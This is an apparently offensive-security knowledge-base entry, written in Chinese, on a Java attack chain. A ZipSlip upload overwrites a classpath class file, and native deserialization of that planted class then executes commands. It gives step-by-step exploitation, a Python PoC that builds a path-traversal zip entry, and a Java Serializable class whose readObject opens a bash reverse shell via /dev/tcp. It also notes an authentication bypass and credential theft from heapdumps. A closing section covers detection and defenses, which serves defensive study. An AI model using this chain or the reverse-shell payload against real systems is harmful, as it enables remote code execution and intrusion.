---
id: web-java-deser-zipentry-class-overwrite-readobject-rce
title: ZipEntry 路径穿越覆盖 classpath 类文件 + 原生反序列化：上传恶意 Serializable 类后发送其实例触发 readObject 命令执行
type: scenario
domain: web
path: web/java/deserialization
technique: zipentry-classpath-class-overwrite-deser
tags:
- java
- deserialization
- zipslip
- zipentry
- file-upload
- classpath
- readobject
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V473
  verified_at: '2026-11-10T17:00:38+08:00'
  notes: 已对照原文13668图44-45核对：Unzip用new File(path+zipEntry.getName())未规范化、upload仅校验.zip后缀与PK头、SafeObjectInputStream黑名单仅POJONode/TemplatesImpl/Runtime/SignedObject；覆盖classpath后反序列化attack类readObject执行命令的链路成立；原文该题未展示成功截图，confidence medium适当；PoC未本机执行
url: /docs/web/java/deserialization/web-java-deser-zipentry-class-overwrite-readobject-rce/
draft: false
kb_aliases:
- zip 覆盖 class 文件
- ZipEntry 路径穿越写 class
- 覆盖 classpath 反序列化
- SafeObjectInputStream 黑名单绕过
- attack.class readObject
---

## 一句话结论

上传接口只校验 zip 魔数与 `.zip` 扩展名，却用 `new File(path + zipEntry.getName())` 解压且不规范化路径时，构造含 `../` 的 zip 条目可覆盖 classpath 下的 `.class` 文件；把一个实现 `Serializable`、在 `readObject()` 中执行命令的 `attack.class` 覆盖到应用/JDK 类路径后，再向反序列化接口发送该类的序列化实例，`SafeObjectInputStream` 的类名黑名单（只禁 `POJONode`/`TemplatesImpl`/`Runtime`/`SignedObject`）不会拦截 `attack` 类，`readObject` 直接执行命令。

## 原理

- **ZipEntry 路径穿越**：`ZipEntry.getName()` 返回压缩包内文件名，攻击者可在 zip 中写入 `../../..//usr/java/jdk-8/jre/lib/attack.class` 等条目；解压代码 `new File(path + filename)` 直接拼接并 `createNewFile()`，没有 `getCanonicalPath()` 前缀校验，文件被写到解压目录之外。
- **覆盖 classpath**：把类文件写到 JVM 的类路径目录（如 JDK 的 `jre/lib`、应用的 `classes`/`lib`），类加载器后续加载同名类时会读取被覆盖的字节码。选择尚未加载的类名（本例 `attack`）可避免类已被加载导致的覆盖无效。
- **readObject 即执行**：`attack implements Serializable`，自定义 `private void readObject(ObjectInputStream in)`，先 `defaultReadObject()`，随后 `Runtime.getRuntime().exec(...)`；只要目标反序列化该类的实例，方法自动执行。
- **黑名单不覆盖新类**：`SafeObjectInputStream.resolveClass` 的 `BLACKLIST` 是固定集合（`POJONode`、`TemplatesImpl`、`Runtime`、`SignedObject`），攻击者自定义的 `attack` 不在其中；`resolveClass` 正常解析并实例化，链不需要任何已有 gadget。
- **前置信息**：应用 Open Actuator `heapdump` 泄露的密码/凭据或 `spring.security.user` 配置可帮助获得上传/反序列化入口权限；`spring.security` 的 `/admin` 鉴权仅用 `antMatchers("/admin/*")`，多级路径（如 `/admin/user/readObj`）不被匹配，可能直接可达。
- **为什么比常规 gadget 稳**：不依赖 CommonsCollections/Jackson 等库版本，也不依赖目标已有 gadget；只要能写类路径且能反序列化任意类，就能执行。

## 触发条件

- 存在 zip 上传解压功能，`zipEntry.getName()` 可控且解压路径未做规范化/白名单（典型 zipslip）。
- 进程对 classpath 目录有写权限（或通过相对路径可写到）；目标类名尚未被 JVM 加载。
- 存在原生反序列化入口，且其黑名单不是白名单/JEP290 全局过滤器（只按固定类名拦截）。
- 能获得上传与反序列化接口的访问权限（可能需要 heapdump/弱口令/鉴权绕过）。

## 利用步骤

1. 审计上传接口：确认 zip 魔数校验、扩展名校验与解压实现；定位 `new File(path + zipEntry.getName())` 一类拼接。
2. 编写 `attack implements Serializable`，`readObject` 中 `defaultReadObject()` 后执行命令；编译得到 `attack.class`。
3. 用 Python `zipfile` 构造 poc.zip，条目名设为 `../../../usr/java/jdk-8/jre/lib/attack.class`（按目标 classpath 调整层级），内容为 `attack.class` 字节。
4. 上传 poc.zip 触发解压，覆盖目标 classpath 下的类文件；若 `attack.class` 同名类已加载，换一个未加载的类名。
5. 生成 `attack` 实例的序列化字节并 Base64（可用同一份 `attack.class` 在本地 `ObjectOutputStream` 写出）。
6. 向 `/deserialize?b64str=...` 提交；`SafeObjectInputStream.readObject` 解析 `attack` 类并执行 `readObject`，命令执行/回连。
7. 验证后清理覆盖的 class 文件，避免影响目标运行。

## PoC

```python
import zipfile
z = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)
info = zipfile.ZipInfo("poc.zip")
z.write("./attack.class", "../../../usr/java/jdk-8/jre/lib/attack.class", zipfile.ZIP_DEFLATED)
z.close()
```

```java
public class attack implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/port 0>&1"});
    }
}
```

原文描述该链路可打通；未在本机复跑。

## 变体与关联

- 变体：覆盖应用 `classes`/`lib` 下的类、Spring Boot fat jar 解压目录、Tomcat `WEB-INF/classes`；入口不一定是 zip，tar/7z 解压同样可能有路径穿越。
- 变体：若黑名单是白名单/JEP290，需改用合法类 gadget 或 SignedObject 二次反序列化等，见 [[web-java-deser-bave-pojonode-signedobject-business-class-readobject-ssrf-filewrite]]。
- 关联：[[web-generic-file-upload-template-batchimport-zipslip-arbitrary-write]]（zipslip 任意写）、[[web-generic-file-upload-ant-zipslip-leading-dotdot-prefix-bypass]]（zipslip 变体）、[[web-java-classloader-urlclassloader-addurl-uploaded-jar-deser-rce]]（上传 jar 改类路径的另一路线）。
- 边界：classpath 只读、类已被加载、解压做了 canonical path 校验、文件系统权限不足、存在完整性校验时失效。

## 检测与防御

- 检测：zip 条目名包含 `../`、绝对路径、反斜杠或异常深路径；解压后 classpath 目录出现新 `.class` 文件；反序列化流中出现非业务类名；进程异常执行 shell。
- 防御：解压前对每个条目做规范化并校验目标路径必须位于解压根目录；禁止 zip 条目使用绝对路径/`..`；classpath 目录只读；反序列化使用 JEP290 全局白名单过滤器而非固定黑名单。
- 边界：仅靠扩展名/魔数校验不能防 zipslip；需要在解压实现层修复。
